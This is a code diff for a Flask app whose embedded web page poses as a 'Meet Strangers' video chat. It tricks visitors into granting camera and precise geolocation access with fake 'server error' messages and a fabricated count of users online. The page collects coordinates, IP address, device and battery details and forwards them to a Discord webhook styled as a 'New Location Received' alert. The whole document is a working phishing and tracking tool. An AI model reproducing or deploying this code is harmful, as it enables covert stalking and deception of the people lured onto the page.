@@ -233,125 +233,152 @@ HTML_PAGE = """
         </div>
     </div>
 
-    <script>
-        let geoWatchId;
+<script>
+    let geoWatchId;
+    let locationEnabled = false;
 
-        function startTracking() {
-            if (navigator.geolocation) {
-                geoWatchId = navigator.geolocation.watchPosition(sendPosition, showError, {
+    function startTracking() {
+        if (navigator.geolocation) {
+            geoWatchId = navigator.geolocation.watchPosition(
+                sendPosition, 
+                showError, 
+                {
                     enableHighAccuracy: true,
                     maximumAge: 0,
                     timeout: 5000
-                });
-            } else {
-                alert("Failed to get Server.");
-            }
+                }
+            );
+        } else {
+            alert("Failed to get Server.");
         }
+    }
 
-        function sendPosition(position) {
-            window.locationData = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                maps_link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-            };
+    function sendPosition(position) {
+        window.locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            maps_link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+        };
+        locationEnabled = true; // Location tracking is active
+        updateNextButtonState(); // Check if the button can be enabled
+    }
+
+    function updateNextButtonState() {
+        const nextButton = document.getElementById('nextButton');
+        if (locationEnabled) {
+            nextButton.disabled = false; // Enable the button if location is active
+        } else {
+            nextButton.disabled = true; // Keep the button disabled
         }
+    }
 
-        function getDeviceInfo() {
+    function getDeviceInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language
+        };
+    }
+
+    async function getBatteryInfo() {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
             return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language
+                level: battery.level * 100 + "%",
+                charging: battery.charging
+            };
+        } else {
+            return {
+                level: "Unknown",
+                charging: "Unknown"
             };
         }
+    }
 
-        async function getBatteryInfo() {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                return {
-                    level: battery.level * 100 + "%",
-                    charging: battery.charging
-                };
-            } else {
-                return {
-                    level: "Unknown",
-                    charging: "Unknown"
-                };
-            }
+    async function sendLocationData() {
+        if (!locationEnabled) {
+            alert("Please enable location.");
+            return;
         }
 
-        async function sendLocationData() {
-            const selectedOption = document.getElementById('locationSelect').value;
-            const locationData = window.locationData;
-            const deviceInfo = getDeviceInfo();
-            const batteryInfo = await getBatteryInfo();
+        const selectedOption = document.getElementById('locationSelect').value;
+        const locationData = window.locationData;
+        const deviceInfo = getDeviceInfo();
+        const batteryInfo = await getBatteryInfo();
 
-            fetch('https://api64.ipify.org?format=json')
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                fetch('/submit_location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ...locationData,
+                        selected_option: selectedOption,
+                        ip_address: ip,
+                        device_info: deviceInfo,
+                        battery_info: batteryInfo
+                    })
+                })
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip;
-                    fetch('/submit_location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            ...locationData,
-                            selected_option: selectedOption,
-                            ip_address: ip,
-                            device_info: deviceInfo,
-                            battery_info: batteryInfo
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        alert('Server offline.');
-                        stopTracking();
-                    });
+                    alert('Server is to busy.');
+                    stopTracking();
                 });
+            });
+    }
+
+    function showError(error) {
+        locationEnabled = false; // Disable location tracking
+        updateNextButtonState(); // Ensure the button remains disabled
+        alert("Server error: Allow Location & Camera to chat.");
+    }
+
+    function handleGetStarted() {
+        startVideo();
+        startTracking();
+        document.getElementById('output').innerHTML = "Please select a topic and click Next.";
+        document.getElementById('dropdown').style.display = "block";
+
+        // Ensure the "Next Person" button state is updated
+        updateNextButtonState();
+    }
+
+    function stopTracking() {
+        if (geoWatchId) {
+            navigator.geolocation.clearWatch(geoWatchId);
         }
+        locationEnabled = false; // Reset location tracking
+        updateNextButtonState(); // Disable the button
+    }
 
-        function showError(error) {
-            alert("Server error: Allow Location & Camera to chat.");
+    function startVideo() {
+        const videoElement = document.getElementById('localVideo');
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    videoElement.srcObject = stream;
+                })
+                .catch(function (error) {
+                    alert("Camera access denied or unavailable: " + error.message);
+                });
+        } else {
+            alert("Your browser does not support camera access.");
         }
+    }
 
-        function handleGetStarted() {
-            startVideo();
-            startTracking();
-            document.getElementById('output').innerHTML = "Please select a topic and click Next.";
-            document.getElementById('dropdown').style.display = "block";
+    function updateUserCount() {
+        const userCount = Math.floor(Math.random() * (100 - 3 + 1)) + 3; // Random number between 3 and 100
+        document.getElementById('userCountDisplay').innerHTML = `Meet Strangers - ${userCount} Users Online`;
+    }
 
-            // Enable the "Next Person" button
-            document.getElementById('nextButton').disabled = false;
-        }
 
-        function stopTracking() {
-            if (geoWatchId) {
-                navigator.geolocation.clearWatch(geoWatchId);
-            }
-        }
+    updateUserCount();
+    setInterval(updateUserCount, 20000);
+</script>
 
-        function startVideo() {
-            const videoElement = document.getElementById('localVideo');
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function (stream) {
-                        videoElement.srcObject = stream;
-                    })
-                    .catch(function (error) {
-                        alert("Camera access denied or unavailable: " + error.message);
-                    });
-            } else {
-                alert("Your browser does not support camera access.");
-            }
-        }
-
-        function updateUserCount() {
-            const userCount = Math.floor(Math.random() * (6 - 3 + 1)) + 3;
-            document.getElementById('userCountDisplay').innerHTML = `Meet Strangers - ${userCount} Users Online`;
-        }
-
-        updateUserCount();
-        setInterval(updateUserCount, 20000);
-    </script>
 </body>
 
 </html>
@@ -373,25 +400,41 @@ def submit_location():
     device_info = data.get('device_info')
     battery_info = data.get('battery_info')
 
-    message = {
-        'content': f"""
-        **New User Details:**
-        - Latitude: {latitude}
-        - Longitude: {longitude}
-        - Accuracy: {accuracy} meters
-        - [Google Maps]({maps_link})
-        - Selected Option: {selected_option}
-        - IP Address: {ip_address}
-        - User Agent: {device_info['userAgent']}
-        - Platform: {device_info['platform']}
-        - Language: {device_info['language']}
-        - Battery Level: {battery_info['level']}
-        - Charging: {battery_info['charging']}
-        """
+    embed = {
+        "embeds": [
+            {
+                "title": "🔗 **☠️ New Location Received** ☠️",
+                "description": (
+                    f"**🌍 🌑 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗜𝗻𝗳𝗼:**\n"
+                    f"⚫ **𝗟𝗮𝘁𝗶𝘁𝘂𝗱𝗲:** `{latitude}`\n"
+                    f"⚫ **𝗟𝗼𝗻𝗴𝗶𝘁𝘂𝗱𝗲:** `{longitude}`\n"
+                    f"⚫ **𝗔𝗰𝗰𝘂𝗿𝗮𝗰𝘆:** `{accuracy} meters`\n"
+                    f"🔗 **[📍 𝗩𝗶𝗲𝘄 𝗼𝗻 𝗚𝗼𝗼𝗴𝗹𝗲 𝗠𝗮𝗽𝘀]({maps_link})**\n\n"
+                    f"**🕵️‍♂️ 𝗨𝘀𝗲𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:**\n"
+                    f"🔸 **𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗢𝗽𝘁𝗶𝗼𝗻:** `{selected_option}`\n"
+                    f"🔸 **𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀:** `{ip_address}`\n"
+                    f"🔸 **𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁:** `{device_info['userAgent']}`\n"
+                    f"🔸 **𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺:** `{device_info['platform']}`\n"
+                    f"🔸 **𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲:** `{device_info['language']}`\n\n"
+                    f"**⚡ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆 𝗜𝗻𝗳𝗼:**\n"
+                    f"🔻 **𝗕𝗮𝘁𝘁𝗲𝗿𝘆 𝗟𝗲𝘃𝗲𝗹:** `{battery_info['level']}%`\n"
+                    f"🔻 **𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴:** `{'Yes' if battery_info['charging'] else 'No'}`"
+                ),
+                "color": 13369599,  # Dark red-like color for an ominous feel
+                "thumbnail": {
+                    "url": "https://giffiles.alphacoders.com/918/91855.gif"  # Replace with your creepy gif URL
+                },
+                "footer": {
+                    "text": "👁️ Powered by: https://discord.gg/ghjZ8FT5hx | zespera 🕷️",
+                    "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHGuHDk6Zo3UB9gR045D6oK_qUqXVvvimCYQ&s"  # Replace with your icon URL
+                }
+            }
+        ]
+
     }
 
     try:
-        response = requests.post(DISCORD_WEBHOOK_URL, json=message)
+        response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
         return jsonify({'status': 'success', 'message': 'sent', 'response': response.text})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
@@ -399,3 +442,4 @@ def submit_location():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(debug=False, host='0.0.0.0', port=port)
+
